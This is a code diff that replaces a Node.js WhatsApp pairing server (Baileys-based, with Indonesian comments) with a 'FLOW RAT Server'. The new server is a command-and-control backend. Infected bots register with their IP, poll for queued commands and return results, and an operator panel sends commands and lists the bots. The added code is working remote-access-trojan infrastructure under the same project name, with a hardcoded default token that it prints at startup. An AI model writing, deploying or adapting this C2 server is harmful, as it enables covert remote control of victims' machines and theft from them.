@@ -1,326 +1,144 @@
-/**
- * FLOW WhatsApp Pairing Server
- * Deploy di Railway
- */
-
-const crypto = require('crypto');
-if (typeof globalThis.crypto === 'undefined') {
-    globalThis.crypto = crypto.webcrypto || crypto;
-}
-if (typeof global.crypto === 'undefined') {
-    global.crypto = globalThis.crypto;
-}
-
 const express = require('express');
 const cors = require('cors');
-const pino = require('pino');
-const fs = require('fs');
-const path = require('path');
-const {
-    default: makeWASocket,
-    useMultiFileAuthState,
-    DisconnectReason,
-    fetchLatestBaileysVersion,
-    makeCacheableSignalKeyStore,
-    Browsers
-} = require('@whiskeysockets/baileys');
+const bodyParser = require('body-parser');
 
 const app = express();
 app.use(cors());
-app.use(express.json());
+app.use(bodyParser.json({ limit: '10mb' }));
+app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));
 
 const PORT = process.env.PORT || 3000;
+const AUTH_TOKEN = process.env.AUTH_TOKEN || 'flow-secret-token-2026';
 
-const sessions = {};
+// ====== STORAGE (in-memory) ======
+const bots = {};
 
-// Rate limit sederhana: 1 request per nomor per 60 detik
-const rateLimit = {};
-const RATE_LIMIT_MS = 60000;
-
-// ============================================================
-// BIKIN SESSION PAIRING (ANTI LOOP)
-// ============================================================
-async function createPairingSession(phone, username) {
-    const sessionDir = path.join(__dirname, 'sessions', phone);
-    if (!fs.existsSync(sessionDir)) {
-        fs.mkdirSync(sessionDir, { recursive: true });
+// ====== MIDDLEWARE AUTH ======
+function requireAuth(req, res, next) {
+    const token = req.headers['x-auth-token'] || req.query.token;
+    if (token !== AUTH_TOKEN) {
+        return res.status(401).json({ error: 'unauthorized' });
     }
-
-    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
-    const { version } = await fetchLatestBaileysVersion();
-
-    const logger = pino({ level: 'silent' });
-
-    const sock = makeWASocket({
-        version,
-        logger,
-        printQRInTerminal: false,
-        browser: Browsers.macOS('Safari'),
-        auth: {
-            creds: state.creds,
-            keys: makeCacheableSignalKeyStore(state.keys, logger)
-        },
-        generateHighQualityLinkPreview: false,
-        syncFullHistory: false,
-        markOnlineOnConnect: false,
-        keepAliveIntervalMs: 30000,
-        connectTimeoutMs: 90000,
-        defaultQueryTimeoutMs: 90000,
-        emitOwnEvents: false,
-        getMessage: async () => ({ conversation: '' })
-    });
-
-    sock.ev.on('creds.update', saveCreds);
-
-    sock.ev.on('connection.update', (update) => {
-        const { connection, lastDisconnect } = update;
-
-        if (connection === 'open') {
-            console.log(`[${phone}] ✅ Connected to WhatsApp`);
-            if (sessions[phone]) {
-                sessions[phone].status = 'connected';
-            }
-        }
-
-        if (connection === 'close') {
-            const statusCode = lastDisconnect?.error?.output?.statusCode;
-            const reason = lastDisconnect?.error?.message || 'unknown';
-
-            // Map status code ke penjelasan
-            let reasonText = reason;
-            if (statusCode === DisconnectReason.loggedOut) reasonText = 'Logged Out';
-            else if (statusCode === 401) reasonText = 'Unauthorized';
-            else if (statusCode === 428) reasonText = 'Connection Terminated (rate limit)';
-            else if (statusCode === 440) reasonText = 'Conflict (paired elsewhere)';
-            else if (statusCode === 500) reasonText = 'Server Error';
-            else if (statusCode === 515) reasonText = 'Stream Error';
-
-            console.log(`[${phone}] ❌ Connection closed. Code: ${statusCode} (${reasonText})`);
-
-            if (sessions[phone]) {
-                sessions[phone].status = 'offline';
-                sessions[phone].lastError = reasonText;
-            }
-
-            // JANGAN auto-reconnect kalau:
-            // - logged out
-            // - rate limit (biar gak loop)
-            // - konflik
-            const DONT_RECONNECT = [
-                DisconnectReason.loggedOut,
-                401,  // unauthorized
-                428,  // rate limit
-                440,  // conflict
-            ];
-
-            const shouldReconnect = !DONT_RECONNECT.includes(statusCode);
-
-            if (shouldReconnect && sessions[phone]) {
-                console.log(`[${phone}] 🔄 Reconnecting in 5s...`);
-                setTimeout(() => {
-                    if (sessions[phone]) {
-                        createPairingSession(phone, username).catch(err => {
-                            console.error(`[${phone}] Reconnect error:`, err.message);
-                        });
-                    }
-                }, 5000);
-            } else {
-                console.log(`[${phone}] 🚫 Not reconnecting (${reasonText})`);
-                // JANGAN hapus session, biar kodenya masih bisa dipake
-            }
-        }
-    });
-
-    if (!sessions[phone]) {
-        sessions[phone] = {
-            sock,
-            code: null,
-            status: 'pending',
-            username: username || 'unknown',
-            createdAt: Date.now()
-        };
-    } else {
-        sessions[phone].sock = sock;
-        sessions[phone].status = 'pending';
-    }
-
-    if (!sock.authState.creds.registered) {
-        await new Promise(r => setTimeout(r, 2000));
-
-        try {
-            const cleanPhone = phone.replace(/[^0-9]/g, '');
-            const code = await sock.requestPairingCode(cleanPhone);
-
-            console.log(`[${phone}] 🔑 Pairing code: ${code}`);
-            sessions[phone].code = code;
-            sessions[phone].status = 'pending';
-
-            return code;
-        } catch (err) {
-            console.error(`[${phone}] Gagal minta pairing code:`, err.message);
-            throw err;
-        }
-    } else {
-        sessions[phone].status = 'connected';
-        return sessions[phone].code;
-    }
+    next();
 }
 
-// ============================================================
-// ENDPOINTS
-// ============================================================
-
+// ====== HEALTH ======
 app.get('/', (req, res) => {
     res.json({
-        status: 'ok',
-        service: 'FLOW WhatsApp Pairing',
-        nodeVersion: process.version,
-        sessions: Object.keys(sessions).length,
-        uptime: process.uptime()
+        status: 'FLOW RAT Server Running',
+        time: new Date().toISOString(),
+        bots_total: Object.keys(bots).length,
+        version: '1.0.0'
     });
 });
 
-app.post('/pair', async (req, res) => {
-    const { phone, username } = req.body || {};
+// ====== BOT REGISTER ======
+app.post('/rat/register', (req, res) => {
+    const { bot_id, info } = req.body;
+    if (!bot_id) return res.status(400).json({ error: 'bot_id required' });
 
-    if (!phone) {
-        return res.status(400).json({ error: 'phone wajib diisi' });
+    if (!bots[bot_id]) {
+        bots[bot_id] = { commands: [], last_result: null };
     }
+    bots[bot_id].info = info || '-';
+    bots[bot_id].last_seen = new Date().toISOString();
+    bots[bot_id].ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '-';
 
-    const cleanPhone = String(phone).replace(/[^0-9]/g, '');
-
-    if (cleanPhone.length < 10) {
-        return res.status(400).json({ error: 'Nomor tidak valid' });
-    }
-
-    // RATE LIMIT
-    const now = Date.now();
-    if (rateLimit[cleanPhone] && (now - rateLimit[cleanPhone]) < RATE_LIMIT_MS) {
-        const waitSec = Math.ceil((RATE_LIMIT_MS - (now - rateLimit[cleanPhone])) / 1000);
-        return res.status(429).json({
-            error: `Terlalu banyak request. Tunggu ${waitSec} detik lagi.`,
-            waitSeconds: waitSec
-        });
-    }
-
-    // Kalau masih pending dengan code valid → return code lama
-    if (sessions[cleanPhone] && sessions[cleanPhone].code && sessions[cleanPhone].status === 'pending') {
-        return res.json({
-            code: sessions[cleanPhone].code,
-            status: 'pending',
-            cached: true
-        });
-    }
-
-    if (sessions[cleanPhone] && sessions[cleanPhone].status === 'connected') {
-        return res.json({
-            code: sessions[cleanPhone].code,
-            status: 'connected',
-            cached: true
-        });
-    }
-
-    // Kalau ada session lama (offline), hapus dulu
-    if (sessions[cleanPhone]) {
-        try {
-            if (sessions[cleanPhone].sock) {
-                await sessions[cleanPhone].sock.logout().catch(() => {});
-            }
-        } catch (e) {}
-        delete sessions[cleanPhone];
-    }
-
-    rateLimit[cleanPhone] = now;
-
-    try {
-        const code = await createPairingSession(cleanPhone, username);
-        res.json({
-            code: code,
-            status: 'pending',
-            cached: false
-        });
-    } catch (err) {
-        console.error('Pair error:', err);
-        res.status(500).json({
-            error: 'Gagal membuat pairing code',
-            details: err.message
-        });
-    }
+    console.log(`[BOT] register: ${bot_id} | ${info}`);
+    res.json({ status: 'ok', bot_id });
 });
 
-app.get('/status/:phone', (req, res) => {
-    const cleanPhone = String(req.params.phone).replace(/[^0-9]/g, '');
-    const s = sessions[cleanPhone];
+// ====== BOT POLL ======
+app.get('/rat/poll/:bot_id', (req, res) => {
+    const { bot_id } = req.params;
+    if (!bots[bot_id]) return res.json({});
 
-    if (!s) {
-        return res.json({ connected: false, status: 'not_found' });
+    bots[bot_id].last_seen = new Date().toISOString();
+    const cmd = bots[bot_id].commands.shift();
+    res.json(cmd || {});
+});
+
+// ====== BOT SEND RESULT ======
+app.post('/rat/result', (req, res) => {
+    const { bot_id, result, cmd_id } = req.body;
+    if (bots[bot_id]) {
+        bots[bot_id].last_result = {
+            cmd_id: cmd_id || null,
+            result: result || '',
+            time: new Date().toISOString()
+        };
+        console.log(`[BOT] result from ${bot_id}: ${result}`);
+    }
+    res.json({ status: 'ok' });
+});
+
+// ====== PANEL SEND COMMAND (AUTH) ======
+app.post('/rat/command', requireAuth, (req, res) => {
+    const { bot_id, command, arg } = req.body;
+    if (!bot_id || !command) {
+        return res.status(400).json({ error: 'bot_id & command required' });
     }
 
-    res.json({
-        connected: s.status === 'connected',
-        status: s.status,
-        code: s.code,
-        lastError: s.lastError || null,
-        createdAt: s.createdAt
+    if (!bots[bot_id]) {
+        bots[bot_id] = { commands: [], last_result: null, info: '-', last_seen: '-' };
+    }
+
+    bots[bot_id].commands.push({
+        id: Date.now(),
+        cmd: command,
+        arg: arg || '',
+        created: new Date().toISOString()
     });
+
+    console.log(`[CMD] ${command} → ${bot_id}${arg ? ' | ' + arg : ''}`);
+    res.json({ status: 'queued', bot_id, command });
 });
 
-app.delete('/session/:phone', async (req, res) => {
-    const cleanPhone = String(req.params.phone).replace(/[^0-9]/g, '');
-    const s = sessions[cleanPhone];
-
-    if (!s) {
-        return res.status(404).json({ error: 'Session tidak ditemukan' });
-    }
-
-    try {
-        if (s.sock) {
-            await s.sock.logout().catch(() => {});
-        }
-    } catch (e) {}
-
-    const sessionDir = path.join(__dirname, 'sessions', cleanPhone);
-    try { fs.rmSync(sessionDir, { recursive: true, force: true }); } catch (e) {}
-
-    delete sessions[cleanPhone];
-    delete rateLimit[cleanPhone];
-
-    res.json({ success: true, message: `Session ${cleanPhone} dihapus` });
+// ====== PANEL LIST BOTS (AUTH) ======
+app.get('/rat/bots', requireAuth, (req, res) => {
+    const list = Object.keys(bots).map(id => {
+        const b = bots[id];
+        const isOnline = b.last_seen && (Date.now() - new Date(b.last_seen).getTime()) < 60000;
+        return {
+            id,
+            info: b.info,
+            ip: b.ip,
+            last_seen: b.last_seen,
+            last_result: b.last_result,
+            pending: b.commands.length,
+            status: isOnline ? 'online' : 'offline'
+        };
+    });
+    res.json({ bots: list, total: list.length });
 });
 
-app.get('/sessions', (req, res) => {
-    const list = Object.keys(sessions).map(phone => ({
-        phone,
-        status: sessions[phone].status,
-        code: sessions[phone].code,
-        lastError: sessions[phone].lastError || null,
-        username: sessions[phone].username,
-        createdAt: sessions[phone].createdAt
-    }));
-    res.json({ total: list.length, sessions: list });
+// ====== PANEL GET RESULT (AUTH) ======
+app.get('/rat/result/:bot_id', requireAuth, (req, res) => {
+    const { bot_id } = req.params;
+    if (!bots[bot_id]) return res.json({ result: null });
+    res.json({ result: bots[bot_id].last_result });
 });
 
-// ============================================================
-// START SERVER
-// ============================================================
+// ====== DELETE BOT (AUTH) ======
+app.delete('/rat/bot/:bot_id', requireAuth, (req, res) => {
+    const { bot_id } = req.params;
+    delete bots[bot_id];
+    res.json({ status: 'deleted' });
+});
+
+// ====== CLEAR QUEUE (AUTH) ======
+app.delete('/rat/queue/:bot_id', requireAuth, (req, res) => {
+    const { bot_id } = req.params;
+    if (bots[bot_id]) bots[bot_id].commands = [];
+    res.json({ status: 'cleared' });
+});
+
+// ====== 404 ======
+app.use((req, res) => {
+    res.status(404).json({ error: 'not found', path: req.path });
+});
+
 app.listen(PORT, () => {
-    console.log(`🚀 FLOW WhatsApp Pairing Server running on port ${PORT}`);
-    console.log(`📦 Node version: ${process.version}`);
-    console.log(`📡 Endpoint: http://localhost:${PORT}`);
+    console.log(`[FLOW RAT] Server running on port ${PORT}`);
+    console.log(`[FLOW RAT] Auth token: ${AUTH_TOKEN}`);
 });
-
-// JANGAN auto-restore session — biar gak crash loop
-// Uncomment kalau perlu
-// (async () => {
-//     const sessionsDir = path.join(__dirname, 'sessions');
-//     if (!fs.existsSync(sessionsDir)) return;
-//     const phones = fs.readdirSync(sessionsDir);
-//     for (const phone of phones) {
-//         try {
-//             console.log(`🔄 Restoring session: ${phone}`);
-//             await createPairingSession(phone, 'restored');
-//         } catch (e) {
-//             console.error(`Gagal restore ${phone}:`, e.message);
-//         }
-//     }
-// })();
